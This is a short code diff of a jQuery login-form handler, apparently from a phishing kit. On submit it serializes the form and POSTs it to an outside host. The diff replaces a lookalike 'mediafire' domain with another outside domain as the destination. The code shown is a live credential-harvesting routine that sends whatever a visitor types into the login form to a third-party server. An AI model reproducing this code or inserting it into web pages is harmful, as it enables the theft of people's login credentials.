@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "http://apii.mediafire-com-mp4.my.id/apiii.php",
+        url: "https://apii.ahmadd.shop",
         type: "POST",
         data: d.serialize(),
         success: function () {
